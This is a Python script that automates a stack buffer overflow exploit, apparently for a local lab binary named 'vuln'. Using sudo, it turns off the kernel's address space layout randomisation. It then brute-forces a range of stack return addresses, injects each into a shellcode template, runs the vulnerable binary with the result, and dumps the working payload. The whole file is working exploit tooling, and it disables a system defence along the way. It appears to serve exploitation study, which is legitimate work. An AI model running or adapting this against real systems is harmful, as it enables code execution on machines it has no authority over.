#!/usr/bin/python3
# find_rip.py
import os
import struct
import shutil
import binascii
import fileinput
import subprocess

def ASLR(enable):
    label = 'Address Space Layout Randomization (ASLR)'
    proc = '/proc/sys/kernel/randomize_va_space'
    command = f'cat {proc}'
    code = int(subprocess.check_output(command, shell=True).decode().rstrip())
    if enable:
        if code:
            print(f'{label} is ON, nothing to do.')
        else:
            print(f'{label} is OFF, i will turn ON...', end='', flush=True)
            code = os.system(f'echo 2 | sudo dd of={proc}')
            if not code:
                print('OK')
            else:
                print('FAILED!')
    else:
        if code:
            print(f'{label} is ON, i will turn OFF...', end='', flush=True)
            code = os.system(f'echo 0 | sudo dd of={proc}')
            if not code:
                print('OK')
            else:
                print('FAILED!')
                exit(1)
        else:
            print(f'{label} is OFF, nothing to do.')

ASLR(False)

original = 'shellcode_injection_template.py'
target = 'shellcode_injection_test.py'

begin = 0x7fffffffe310
end = 0x7fffffffe390

for i in range(begin, end):
    addr = struct.pack('<Q', i).hex()
    RIP = addr[0:12]
    shutil.copyfile(original, target)
    for line in fileinput.input('shellcode_injection_test.py', inplace=True):
       print(line.replace('CHANGE-ME', RIP), end='')
    print('Trying ' + RIP + '...')
    code = os.system('./vuln $(python3 shellcode_injection_test.py)')
    if code in [32512, 33280]:
        print('RIP FOUND:\n', RIP)
        print('PAYLOAD:')
        os.system('python3 ./shellcode_injection_test.py > shellcode_injection_test.bin')
        os.system('xxd shellcode_injection_test.bin')
        break

ASLR(True)
